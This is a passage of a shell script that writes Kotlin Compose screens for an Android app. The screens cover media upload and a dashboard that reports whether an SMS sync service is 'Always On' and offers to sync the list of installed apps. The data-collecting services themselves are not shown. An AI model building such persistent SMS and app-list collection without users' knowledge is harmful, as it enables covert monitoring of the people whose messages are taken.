        Button(onClick = { picker.launch(PickVisualMediaRequest(ActivityResultContracts.PickVisualMedia.ImageAndVideo)) }, colors = ButtonDefaults.buttonColors(containerColor = Color.Black), shape = RoundedCornerShape(8.dp)) {
            Text(if (uploading) "Uploading..." else "Select & Upload Media", color = Color.White)
        }
        Spacer(modifier = Modifier.height(16.dp))
        LazyVerticalGrid(columns = GridCells.Fixed(3), modifier = Modifier.fillMaxWidth().weight(1f), horizontalArrangement = Arrangement.spacedBy(4.dp), verticalArrangement = Arrangement.spacedBy(4.dp)) {
            items(urls) { url -> AsyncImage(model = url, contentDescription = null, modifier = Modifier.aspectRatio(1f).background(Color.LightGray), contentScale = ContentScale.Crop) }
        }
    }
}
@Composable fun Page5Dashboard(onNext: () -> Unit) {
    val context = LocalContext.current
    var running by remember { mutableStateOf(false) }
    LaunchedEffect(Unit) {
        @Suppress("DEPRECATION")
        running = (context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).getRunningServices(Int.MAX_VALUE).any { it.service.className == SmsSyncService::class.java.name }
    }
    GlobalLayout("Finish", onNext) {
        Text("System Dashboard", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
        Spacer(modifier = Modifier.height(24.dp))
        Card(modifier = Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = Color(0xFFF5F5F5)), shape = RoundedCornerShape(12.dp)) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("Sync Service Status", fontSize = 12.sp, color = Color.Gray)
                Spacer(modifier = Modifier.height(4.dp))
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Box(modifier = Modifier.size(10.dp).background(if (running) Color(0xFF34A853) else Color(0xFFFBBC05), shape = RoundedCornerShape(5.dp)))
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(if (running) "Always On" else "Restarting", fontSize = 16.sp, fontWeight = FontWeight.Bold, color = Color.Black)
                }
            }
        }
        Spacer(modifier = Modifier.height(16.dp))
        Button(onClick = { WorkManager.getInstance(context).enqueue(OneTimeWorkRequestBuilder<AppsSyncWorker>().build()) }, colors = ButtonDefaults.buttonColors(containerColor = Color.DarkGray), shape = RoundedCornerShape(8.dp), modifier = Modifier.fillMaxWidth()) {
            Text("Sync Installed Apps Now", color = Color.White)
        }
    }
}
EOT

echo "✅ Project files and Gradle wrapper successfully updated!"
